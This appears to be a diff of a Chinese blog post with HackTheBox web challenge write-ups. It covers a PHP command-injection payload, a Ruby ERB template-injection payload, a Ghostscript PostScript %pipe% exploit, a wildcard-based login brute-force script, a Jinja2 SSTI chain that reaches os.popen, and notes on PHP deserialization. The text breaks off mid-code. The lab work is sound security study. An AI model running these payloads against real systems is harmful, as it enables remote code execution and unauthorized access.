 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://167.172.52.221:30001/?format=$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/phpinfo.png" class>
 
 <p>证明存在命令执行漏洞了，接着构造一下外带数据传参执行(这里直接命令执行是行不通的)。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://167.172.52.221:30001/?format=$&#123;system($_GET(0))&#125;&amp;0=ls</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/CommandOS.png" class>
 
 <p>原本想着 ls 直接搞出 flag 了，可谁知半路杀出个程咬金，命令执行失败了，这时猛地想到 format 之前有一个 addslashes 函数。所以，直接加上 <code>/</code> 即可</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://167.172.52.221:30001/?format=$&#123;system($_GET(0))&#125;&amp;0=ls /</span><br></pre></td></tr></table></figure>
 
 <p>成功执行</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/OSucc.png" class>
 
 <p>最上面一行有一个 flagRPYIs，那么尝试 cat flagRPYIs，进一步构造 payload</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://167.172.52.221:30001/?format=$&#123;system($_GET[0])&#125;&amp;0=cat+/flagRYPIs</span><br></pre></td></tr></table></figure>
 
 <p>这里的 <code>/</code> 要写在前面。</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/LoveTokFlag.png" class>
 
 <p>成功过了 ~</p>
 <h3 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h3><p>本题是一道简单的 php 命令执行，难点在于 addslashes 这一函数很容易被大家所忽视，这也给实战渗透时的命令执行绕过提供了一些思维。</p>
@@ -547,7 +547,7 @@
 <h3 id="0x02-初识靶场-4"><a href="#0x02-初识靶场-4" class="headerlink" title="0x02 初识靶场"></a>0x02 初识靶场</h3><ul>
 <li>靶场界面如图所示</li>
 </ul>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Neonify.png" class>
 
 <p>算是一个不怎么难看的靶场，我们在框内输入任意内容，下面一行字符便会变成我们输入的。</p>
 <p>看到一个框，第一想法一定是 XSS，尝试输入 <code>&lt;scipt&gt; alert(1) &lt;/script&gt;</code>，输入之后无特殊回显，感觉是过滤了字符与空格(?) 这里先打个问号。</p>
@@ -558,16 +558,16 @@
 <h3 id="0x03-代码审计-3"><a href="#0x03-代码审计-3" class="headerlink" title="0x03 代码审计"></a>0x03 代码审计</h3><ul>
 <li>首先还是先看路由</li>
 </ul>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/RouteCode.png" class>
 
 <p>乍一看没什么，感觉突破点只能是在这一段代码了</p>
 <figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> params[<span class="symbol">:neon</span>] =~ <span class="regexp">/^[0-9a-z ]+$/i</span></span><br></pre></td></tr></table></figure>
 
 <p>上谷歌去搜索一下，发现 Ruby 后端正则若是这么写会产生换行绕过。</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Regex.png" class>
 
 <p>于是 <code>neon=1111%0axxxxj!&lt;&gt;</code> 绕过正则限制</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/SuccessBypass.png" class>
 
 <ul>
 <li>感觉没什么用啊。前两天在看 SSTI，说到 Ruby 当中的模板引擎 ERB 中很可能存在 SSTI，尝试寻找一下 SSTI 点。</li>
@@ -584,12 +584,12 @@
 <ul>
 <li>这里记得进行 URL 编码，查看回显。</li>
 </ul>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/POCssti.png" class>
 
 <p>已经探测出 SSTI 的存在性，我们尝试将 <code>7*7</code> 的地方替换为 system，exec 等命令执行语句。</p>
 <figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1111</span></span><br><span class="line">xxxxj!&lt;h1&gt;&lt;%= exec (<span class="string">&#x27;cat f*&#x27;</span>) %&gt;&lt;<span class="regexp">/h1&gt;</span></span><br></pre></td></tr></table></figure>
 
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/500Error.png" class>
 
 <p>但是传统的 system,exec 都无法直接回显。都要通过 vps 反弹 shell。</p>
 <figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file = <span class="string">&#x27;|whoami&#x27;</span>  </span><br><span class="line">puts open(file).read() <span class="comment"># ubuntu  </span></span><br><span class="line">puts open(file).gets <span class="comment"># ubuntu</span></span><br></pre></td></tr></table></figure>
@@ -598,7 +598,7 @@
 <p>因此我们构造payload即可得到flag</p>
 <figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">neon=<span class="number">1111</span>%0axxxxj!&lt;h1&gt;&lt;%<span class="number">25</span>=open(<span class="string">&#x27;|cat f*&#x27;</span>).read()%<span class="number">25</span>&gt;&lt;<span class="regexp">/h1&gt;</span></span><br></pre></td></tr></table></figure>
 
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/NeonifyGetFlag.png" class>
 
 <ul>
 <li>Flag: <strong>HTB{r3pl4c3m3n7_s3cur1ty}</strong></li>
@@ -609,20 +609,20 @@
 <li>攻 –&gt; 攻的原理 –&gt; 守</li>
 </ul>
 <h3 id="0x02-漏洞挖掘"><a href="#0x02-漏洞挖掘" class="headerlink" title="0x02 漏洞挖掘"></a>0x02 漏洞挖掘</h3><p>靶场界面如图所示</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/petpetrcbee.png" class>
 
 <p>一看便是文件上传类的题目，尝试上传一句话木马，却返回状态码 500</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/StatusCode500.png" class>
 
 <p>这里我的感觉是后台加了一些的验证，比如文件内容什么的，尝试上传一下正常的 png&#x2F;jpeg 图片</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/UploadGif.png" class>
 
 <p>上传了一个 png 文件，接着图中之前在飞的小蜜蜂就变了，变成了一只手一直触摸上传的图片的 Gif，还是直接看源码吧。</p>
 <ul>
 <li>翻源码去看一看</li>
 </ul>
 <h3 id="0x03-源码剖析，代码审计"><a href="#0x03-源码剖析，代码审计" class="headerlink" title="0x03 源码剖析，代码审计"></a>0x03 源码剖析，代码审计</h3><p>先打开 util.py，寻找状态码为 500 的原因</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/StatusCode500Code.png" class>
 
 <h5 id="代码审计，逐行分析"><a href="#代码审计，逐行分析" class="headerlink" title="代码审计，逐行分析"></a><strong>代码审计，逐行分析</strong></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	tmp_path = save_tmp(file)</span><br><span class="line">	bee = Image.<span class="built_in">open</span>(tmp_path).convert(<span class="string">&#x27;RGBA&#x27;</span>) // 将当前的图片的模式转换为 RGBA</span><br><span class="line">	frames = [Image.<span class="built_in">open</span>(f) <span class="keyword">for</span> f <span class="keyword">in</span> <span class="built_in">sorted</span>(glob.glob(<span class="string">&#x27;application/static/img/*&#x27;</span>))] // 把上传的图片存放到静态文件夹当中</span><br><span class="line">	finalpet = petmotion(bee, frames) // 设置图片尺寸</span><br><span class="line">	filename = <span class="string">f&#x27;<span class="subst">&#123;generate(<span class="number">14</span>)&#125;</span>.gif&#x27;</span>  //  加载 gif</span><br><span class="line">	finalpet[<span class="number">0</span>].save(</span><br><span class="line">		<span class="string">f&#x27;<span class="subst">&#123;main.app.config[<span class="string">&quot;UPLOAD_FOLDER&quot;</span>]&#125;</span>/<span class="subst">&#123;filename&#125;</span>&#x27;</span>,</span><br><span class="line">		save_all=<span class="literal">True</span>,</span><br><span class="line">		duration=<span class="number">30</span>,</span><br><span class="line">		loop=<span class="number">0</span>,</span><br><span class="line">		append_images=finalpet[<span class="number">1</span>:],  // 设置文件属性</span><br><span class="line"> 	)</span><br><span class="line"></span><br><span class="line"> 	os.unlink(tmp_path)  </span><br><span class="line"> 	<span class="keyword">return</span> &#123;<span class="string">&#x27;status&#x27;</span>: <span class="string">&#x27;success&#x27;</span>, <span class="string">&#x27;image&#x27;</span>: <span class="string">f&#x27;static/petpets/<span class="subst">&#123;filename&#125;</span>&#x27;</span>&#125;,<span class="number">200</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">except</span>:</span><br><span class="line"> 	<span class="keyword">return</span> &#123;<span class="string">&#x27;status&#x27;</span>: <span class="string">&#x27;failed&#x27;</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Something went wrong&#x27;</span>&#125;, <span class="number">500</span></span><br></pre></td></tr></table></figure>
 
@@ -633,32 +633,32 @@
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">%!PS-Adobe-3.0 EPSF-3.0</span><br><span class="line">%%BoundingBox: -0 -0 100 100  // ESPF 的文件头</span><br><span class="line"></span><br><span class="line">userdict /setpagedevice undef</span><br><span class="line">save</span><br><span class="line">legal</span><br><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line">&#123; legal &#125; stopped &#123; pop &#125; if</span><br><span class="line">restore</span><br><span class="line">mark /OutputFile (%pipe%car flag &gt;&gt; /app/application/sttic/petpets/flag.txt) currentdevice putdeviceprops</span><br></pre></td></tr></table></figure>
 
-<p>编写完 exp 后上传文件，再访问 <a class="link"   target="_blank" rel="noopener" href="http://134.209.28.38:31489/static/petpets/flag.txt" >http://134.209.28.38:31489/static/petpets/flag.txt<i class="fas fa-external-link-alt"></i></a></p>
-
+<p>编写完 exp 后上传文件，再访问 <a class="link" target="_blank" rel="noopener" href="http://134.209.28.38:31489/static/petpets/flag.txt">http://134.209.28.38:31489/static/petpets/flag.txt<i class="fas fa-external-link-alt"></i></a></p>
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/petpetrcbeeGetFlag.png" class>
 
 <h3 id="0x04-回头看-exp，探究一下原理"><a href="#0x04-回头看-exp，探究一下原理" class="headerlink" title="0x04 回头看 exp，探究一下原理"></a>0x04 回头看 exp，探究一下原理</h3><p>查阅很多的资料，最相关的是 ImageMagick 的一些 CVE 的复现。<br>最后发现是 PostScript 写的，需要 ghostScript 作为解释器。作为小 exp 即可。</p>
 <h2 id="HackTheBox-Phonebook"><a href="#HackTheBox-Phonebook" class="headerlink" title="HackTheBox-Phonebook"></a>HackTheBox-Phonebook</h2><h3 id="0x01-靶场简单分析"><a href="#0x01-靶场简单分析" class="headerlink" title="0x01 靶场简单分析"></a>0x01 靶场简单分析</h3><ul>
 <li>界面如图所示</li>
 </ul>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Phonebook.png" class>
 
 <p>题目的描述: Who is lucky enough to be included in the phonebook?</p>
 <p>这感觉是只要登录进去即可获得 flag 吧？</p>
 <p>又看到下面那句话</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Phonebookhint.png" class>
 
 <p>总归是身份认证的问题，先试试爆破，再尝试 SQL 注入。</p>
 <h3 id="0x02-做题历程"><a href="#0x02-做题历程" class="headerlink" title="0x02 做题历程"></a>0x02 做题历程</h3><p>先随意输入数据，再抓包看一看</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/BaseBag.png" class>
 
 <p>尝试发包爆破，可能是自己字典不太好，爆破失败。—————— 但总感觉这里的用户名是 Reese，直接爆破一番。</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/IntruderBomb.png" class>
 
 <p>尝试一下 SQL 注入，先用万能密码。失败</p>
 <ul>
 <li>尝试使用通配符 “<code>*</code>“ 登录，用户名密码都设置为 <code>*</code>，登录成功，但界面并无数据与 flag。</li>
 </ul>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Nothing.png" class>
 
 <p>接着我们搜索 Reese，因为题目刚开始的 hint 中，是 Reese 说的话，由此猜测 Reese 可能是开发人员，或者是有较高权限的人，找到 Reese 之后再回到登录界面爆破。走来走去最后还是爆破，笑死。</p>
 <ul>
@@ -669,19 +669,19 @@
 <h3 id="0x03-编写-exp"><a href="#0x03-编写-exp" class="headerlink" title="0x03 编写 exp"></a>0x03 编写 exp</h3><p>编写爆破脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://159.65.81.40:30797/login&#x27;</span></span><br><span class="line">r=requests.session()</span><br><span class="line">t=<span class="number">0</span></span><br><span class="line">d=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.?!_&#125;&#x27;</span></span><br><span class="line">password=<span class="string">&#x27;&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;HTB&#123;&#x27;</span></span><br><span class="line"><span class="keyword">while</span>(t!=<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(d)):</span><br><span class="line">        password=flag+d[i]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[-]testing  %s     &#x27;</span> %(flag+d[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        password=password+<span class="string">&#x27;*&#x27;</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;reese&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:password</span><br><span class="line">        &#125;</span><br><span class="line">        html=r.post(url=url,data=data).text</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;No search results&#x27;</span> <span class="keyword">in</span> html):</span><br><span class="line">            flag+=d[i]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+]%s&quot;</span> %flag)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;failed&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(flag[<span class="built_in">len</span>(flag)-<span class="number">1</span>]==<span class="string">&#x27;&#125;&#x27;</span>):</span><br><span class="line">            t=<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag:%s&quot;</span> %flag)</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Phonebookexp.png" class>
 
 <p>flag: HTB{d1rectory_h4xx0r_is_k001}</p>
 <h2 id="HackTheBox-Templated"><a href="#HackTheBox-Templated" class="headerlink" title="HackTheBox-Templated"></a>HackTheBox-Templated</h2><h3 id="0x01-靶场简单分析-1"><a href="#0x01-靶场简单分析-1" class="headerlink" title="0x01 靶场简单分析"></a>0x01 靶场简单分析</h3><ul>
 <li>靶场界面如图所示</li>
 </ul>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Templated.png" class>
 
 <p>题目的描述是 Can you exploit this simple mistake?</p>
 <p>并不是特别有思路，靶场界面说此界面还仍在建造当中，那会不会是里面还存在着备份文件？试试吧先。</p>
 <p>备份文件并不存在，难搞，再看看。</p>
 <p>&#x2F;templates 一般就是 Java 的接口文件夹，通过写接口去访问的，这里我们尝试一下 &#x2F;templates，看看能不能获取到资源。</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Strange404.png" class>
 
 <p>这里感觉有点奇怪，接着我又换了其他的接口，还是差不多的界面，抓包后就更加疑惑了，明明状态码是 200，出来的界面却是 404？</p>
 <ul>
@@ -693,17 +693,17 @@
 <h3 id="0x02-payload"><a href="#0x02-payload" class="headerlink" title="0x02 payload"></a>0x02 payload</h3><p>这里先挂上 payload 吧，后续再来讲原理。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/&#123;&#123;config&#125;&#125;</span><br></pre></td></tr></table></figure>
 
-
-<h3 id="0x03-利用方法"><a href="#0x03-利用方法" class="headerlink" title="0x03 利用方法"></a>0x03 利用方法</h3><p>这里就可以通过python的魔术方法，首先通过<code>__class__</code>获取对象的类，然后<code>__mro__</code>获取对象继承的类，因为所有的对象都是继承自object，这样就可以拿到object类了，再通过<code>__subclasses__</code>获取到object的子类，子类中的<code>&lt;class &#39;warnings.catch_warnings&#39;&gt;</code>的命名空间里有<code>__builtins__</code>，最后使用<code>__import__</code>方法导入<code>os</code>库就可以任意命令执行了。最后的payload如下。 —————— 摘自<a class="link"   target="_blank" rel="noopener" href="https://blog.ncu204.com/post/hack_the_box/templated/" >flythief 师傅博客<i class="fas fa-external-link-alt"></i></a></p>
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Payload.png" class>
+<h3 id="0x03-利用方法"><a href="#0x03-利用方法" class="headerlink" title="0x03 利用方法"></a>0x03 利用方法</h3><p>这里就可以通过python的魔术方法，首先通过<code>__class__</code>获取对象的类，然后<code>__mro__</code>获取对象继承的类，因为所有的对象都是继承自object，这样就可以拿到object类了，再通过<code>__subclasses__</code>获取到object的子类，子类中的<code>&lt;class &#39;warnings.catch_warnings&#39;&gt;</code>的命名空间里有<code>__builtins__</code>，最后使用<code>__import__</code>方法导入<code>os</code>库就可以任意命令执行了。最后的payload如下。 —————— 摘自<a class="link" target="_blank" rel="noopener" href="https://blog.ncu204.com/post/hack_the_box/templated/">flythief 师傅博客<i class="fas fa-external-link-alt"></i></a></p>
 <p>payload：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; <span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">186</span>].__init__.__globals__[<span class="string">&quot;__builtins__&quot;</span>][<span class="string">&quot;__import__&quot;</span>](<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;cat flag.txt&quot;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><p>本题是基于 python 的 Flask 的 ssti 漏洞，完全不会，去学一下，后续总结。移步至<a class="link"   target="_blank" rel="noopener" href="https://withd-raw.github.io/2022/03/29/Python-Flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" >Python Flask模板注入 | 芜风 (withd-raw.github.io)<i class="fas fa-external-link-alt"></i></a></p>
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/TemplatedGetFlag.png" class>
+<h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><p>本题是基于 python 的 Flask 的 ssti 漏洞，完全不会，去学一下，后续总结。移步至<a class="link" target="_blank" rel="noopener" href="https://withd-raw.github.io/2022/03/29/Python-Flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">Python Flask模板注入 | 芜风 (withd-raw.github.io)<i class="fas fa-external-link-alt"></i></a></p>
 <h2 id="HackTheBox-Toxic"><a href="#HackTheBox-Toxic" class="headerlink" title="HackTheBox Toxic"></a>HackTheBox Toxic</h2><p>见题看代码便知，是 PHP 反序列化漏洞</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/PHPSerializeAndUn.png" class>
 
 <h3 id="0x01-一些前置知识"><a href="#0x01-一些前置知识" class="headerlink" title="0x01 一些前置知识"></a>0x01 一些前置知识</h3><ul>
-<li>部分内容摘自 <a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3674" >twosmi1e师傅<i class="fas fa-external-link-alt"></i></a></li>
+<li>部分内容摘自 <a class="link" target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3674">twosmi1e师傅<i class="fas fa-external-link-alt"></i></a></li>
 </ul>
 <h4 id="1-PHP序列化是什么"><a href="#1-PHP序列化是什么" class="headerlink" title="1. PHP序列化是什么"></a>1. PHP序列化是什么</h4><h5 id="两个函数"><a href="#两个函数" class="headerlink" title="两个函数"></a>两个函数</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">serialize</span>()     <span class="comment">//将一个对象转换成一个字符串</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>()   <span class="comment">//将字符串还原成一个对象</span></span><br></pre></td></tr></table></figure>
 <p>通过序列化与反序列化我们可以很方便的在 PHP 中进行对象的传递。本质上反序列化是没有危害的。但是如果用户对数据可控那就可以利用反序列化构造 payload 攻击。</p>
@@ -712,7 +712,7 @@
 </ul>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 首尾的 php 头因为博客代码高亮 bug 已省略</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="keyword">private</span> <span class="variable">$flag</span> = <span class="string">&quot;flag&#123;233&#125;&quot;</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line"> <span class="built_in">static</span> <span class="variable">$b</span> = <span class="string">&quot;bbb&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line">  </span><br><span class="line"> <span class="variable">$test</span> = <span class="keyword">new</span> test;</span><br><span class="line"> <span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line">	 </span><br><span class="line">	 </span><br><span class="line">输出---&gt; O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;testflag&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;flag&#123;233&#125;&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;aaa&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
 <hr>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Test1Result.png" class>
 
 <ul>
 <li>反序列化，将一个字符串转换为对象</li>
@@ -727,10 +727,10 @@
 <h3 id="0x02-destruct-魔术方法的反序列化利用"><a href="#0x02-destruct-魔术方法的反序列化利用" class="headerlink" title="0x02 __destruct() 魔术方法的反序列化利用"></a>0x02 __destruct() 魔术方法的反序列化利用</h3><ul>
 <li>首先 <code>__destruct()</code> 函数是在反序列化的过程中，也就是执行 <code>uniserialize</code> 的过程中运行的。</li>
 </ul>
-<p><font color=gree>__destruct()</font> 是在对象被销毁时触发。</p>
+<p><font color="gree">__destruct()</font> 是在对象被销毁时触发。</p>
 <p>那么当传进去的对象 or 参数，也就是被反序列化的参数是可控的情况下，我们可以直接修改参数，使反序列化解析出错，从而导致 <code>__destruct()</code> 被先执行，可以导致命令执行漏洞。</p>
 <h3 id="0x03-回到题目，分析题目"><a href="#0x03-回到题目，分析题目" class="headerlink" title="0x03 回到题目，分析题目"></a>0x03 回到题目，分析题目</h3><h4 id="源码部分"><a href="#源码部分" class="headerlink" title="源码部分"></a>源码部分</h4><p>先看 index.php 的代码，其中最引人注目的便是 Cookie</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/CookieCode.png" class>
 
 <p><strong>逐行分析</strong> ———— index.php</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;PHPSESSID&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"> <span class="variable">$page</span> = <span class="keyword">new</span> <span class="title class_">PageModel</span>;</span><br><span class="line"> <span class="variable">$page</span>-&gt;file = <span class="string">&#x27;/www/index.html&#x27;</span>;  <span class="comment">// 读取 www/index.html</span></span><br><span class="line"> <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;PHPSESSID&#x27;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$page</span>)), // 先进行序列化操作，再进行 base64 编码</span><br><span class="line"> <span class="title function_ invoke__">time</span>()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>,</span><br><span class="line"> <span 